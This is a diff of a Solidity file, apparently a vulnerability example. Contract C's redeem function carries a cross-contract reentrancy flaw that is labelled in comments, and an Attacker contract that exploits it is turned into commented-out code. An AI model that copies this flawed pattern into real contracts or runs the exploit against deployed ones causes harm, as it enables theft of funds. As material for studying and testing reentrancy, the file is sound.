@@ -1,5 +1,38 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.24;
+pragma solidity ^0.8.0;
+
+contract C {
+    Vault public immutable vault;
+    bool private locked = false;
+
+    modifier nonReentrant() {
+        require(!locked, "Locked");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    constructor(address _vault) { vault = Vault(_vault); }
+
+    // the following function is vulnerable to a cross-contract reentrancy attack
+    function redeem(address payable to) external nonReentrant {
+        vault.setEnabled(true); 
+
+        uint256 amt = vault.takeAll(to);
+
+        // here an attacker can enter the Vault contract and call its functions that requires the enabled flag
+        (bool success, ) = to.call{value: amt}(""); 
+        require(success, "Refund failed");
+
+        vault.setEnabled(false);
+    }
+
+    receive() external payable {
+        vault.setEnabled(true); 
+        vault.increase(msg.sender, msg.value);
+        vault.setEnabled(false);
+    }
+}
 
 contract Vault {
     mapping(address => uint256) private balances; 
@@ -28,57 +61,28 @@ contract Vault {
     }
 }
 
-contract C {
-    Vault public immutable vault;
-    bool private locked = false;
+// Contract C contains a cross-contract reentrancy vulnerability that can be exploited by an attacker.
+// Specifically, the attacker can enter the Vault contract and invoke the `increase` function
+// during the execution of the `redeem` function, which pays back funds. This allows the attacker
+// to manipulate the contract's state and potentially drain funds.
 
-    modifier nonReentrant() {
-        require(!locked, "Locked");
-        locked = true;
-        _;
-        locked = false;
-    }
+// contract Attacker {
+//     Vault public immutable vault;
+//     C public immutable c;
 
-    constructor(address _vault) { vault = Vault(_vault); }
+//     constructor(address _vault, address payable _c) {
+//         vault = Vault(_vault);
+//         c = C(_c);
+//     }
 
-    function redeem(address payable to) external payable nonReentrant {
-        vault.setEnabled(true); 
+//     function attack() public {
+//         c.redeem(payable(msg.sender));
+//         c.redeem(payable(msg.sender));  // the second redeem() will pay 1000
+//     }
 
-        uint256 amt = vault.takeAll(to);
+//     receive() external payable {
+//         vault.increase(msg.sender, 1000);
+//     }
 
-        (bool success, ) = to.call{value: amt}("");
-        require(success, "Refund failed");
+// }
 
-        vault.setEnabled(false);
-    }
-
-    receive() external payable {}
-}
-
-contract Attacker {
-    Vault public immutable vault;
-    C public immutable c;
-
-    constructor(address _vault, address payable _c) {
-        vault = Vault(_vault);
-        c = C(_c);
-    }
-
-    function attack() public {
-        c.redeem(payable(msg.sender));
-        c.redeem(payable(msg.sender));  // the second redeem() will pay 1000
-    }
-
-    receive() external payable {
-        vault.increase(msg.sender, 1000);
-    }
-
-}
-
-contract Deployer {
-    function deploy() public {
-        Vault v = new Vault();
-        C c = new C(address(v));
-        v.setAdmin(address(c));
-    }
-}
